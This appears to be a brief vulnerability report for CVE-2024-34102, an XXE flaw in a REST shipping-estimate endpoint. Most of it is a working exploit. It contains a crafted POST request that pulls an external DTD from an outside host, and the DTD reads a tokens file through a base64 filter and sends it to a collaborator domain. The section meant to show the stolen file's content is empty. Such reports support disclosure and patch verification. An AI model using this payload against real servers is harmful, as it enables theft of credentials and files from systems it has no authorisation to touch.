# Reading server files using XXE CVE-2024-34102 [$DOMAIN]


An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

POST Request 
``` 

POST /rest/V1/guest-carts/1/estimate-shipping-methods HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/116.0
Connection: close
Content-Length: 259
Content-Type: application/json
Accept-Encoding: gzip

{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://www.info-sec.cl/malicious2.dtd\"> %sp; %param1; ]> <r>&exfil;</r>","options":16}}}}}}

```

File malicious2.dtd 

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/mnt/shared/fastly_tokens.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://$COLLABID.oastify.com/dtdcoke.xml?%data;'>">

```

Content of ` /mnt/shared/fastly_tokens.txt` file

```

```

# Impact 

Reading sensitive information from files.
